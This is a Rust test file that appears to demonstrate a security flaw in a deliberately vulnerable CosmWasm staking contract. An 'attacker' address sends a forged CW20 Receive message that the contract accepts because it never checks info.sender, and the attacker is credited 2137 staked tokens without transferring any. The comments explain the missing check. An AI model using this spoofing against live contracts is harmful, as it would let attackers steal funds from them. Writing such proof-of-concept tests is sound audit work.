use cosmwasm_std::{Addr, Uint128};
use cw_receive::contract::{execute, instantiate, query};
use cw_receive::msg::{InstantiateMsg, ExecuteMsg, QueryMsg, StakeResponse, Cw20HookMsg};
use cw_multi_test::{App, ContractWrapper, Executor};
use cw20::Cw20ReceiveMsg;

#[test]
    fn insufficient_token_address_validation_test() {
        let mut app = App::default();
        let code = ContractWrapper::new(execute, instantiate, query);
        let code_id = app.store_code(Box::new(code));
        // The contract has no real life functionality
        let contract_addr = app
            .instantiate_contract(
                code_id,
                Addr::unchecked("owner"),
                &InstantiateMsg { owner: Addr::unchecked("owner").to_string(), token: Addr::unchecked("owner").to_string() },
                &[],
                "Contract",
                None,
            )
            .unwrap();
 
            let encoded = cosmwasm_std::to_binary(&Cw20HookMsg::Stake {});
            // https://github.com/CosmWasm/cw-plus/blob/main/packages/cw20/README.md#receiver
            // Receive{sender, amount, msg} - This is designed to handle Send messages. The address of the contract is stored in info.sender so it cannot be faked. 
            // The contract should ensure the sender matches the token contract it expects to handle, and not allow arbitrary addresses.
            // Due to the fasct that contract does not verify info.sender, attacker can spoof the ReceiveMsg.
            let stake_fake_token = app.execute_contract(Addr::unchecked("attacker"), contract_addr.clone(), &ExecuteMsg::Receive(Cw20ReceiveMsg {
                sender: "attacker".to_string(),
                amount: Uint128::new(2137),
                msg: encoded.unwrap(),
            }), &[]);
            println!("{:?}", stake_fake_token);
            let query_stkaing_info: StakeResponse = app.wrap().query_wasm_smart(contract_addr, &QueryMsg::StakerInfo{ staker: "attacker".to_string() }).unwrap();
            println!("{:?}", query_stkaing_info.amount);
            // Check balance of attacker
            assert_eq!(Uint128::new(2137),query_stkaing_info.amount);

        }
        